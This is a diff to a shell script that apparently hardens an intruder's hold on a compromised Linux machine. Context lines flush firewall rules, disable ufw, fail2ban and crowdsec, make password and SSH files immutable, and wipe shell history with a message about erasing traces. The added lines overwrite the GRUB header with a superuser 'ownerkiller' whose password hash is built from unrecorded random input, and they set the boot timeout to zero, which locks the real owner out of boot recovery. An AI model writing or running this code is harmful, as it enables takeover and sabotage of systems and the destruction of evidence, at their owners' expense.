@@ -25,6 +25,20 @@ nft flush ruleset &>/dev/null
 systemctl stop ufw fail2ban crowdsec &>/dev/null
 systemctl disable ufw fail2ban crowdsec &>/dev/null
 chattr +i /etc/passwd /etc/shadow /etc/ssh/sshd_config /etc/hosts.deny 2>/dev/null
+
+
+cat > /etc/grub.d/00_header <<EOF
+set superusers="ownerkiller"
+password_pbkdf2 ownerkiller grub.pbkdf2.sha512.10000.$(echo "$(openssl rand -base64 128)" | grub-mkpasswd-pbkdf2 -c 10000 -s 16 | grep hash | awk '{print $7}')
+export superusers
+set root=hd0,1
+insmod part_gpt
+insmod part_msdos
+EOF
+chmod 700 /etc/grub.d/00_header
+echo "set timeout=0" >> /etc/grub.d/40_custom
+update-grub 2>/dev/null
+
 clean() {
     echo "[!] Đang dọn dấu vết 100%..."
     history -c; echo "" > /root/.bash_history
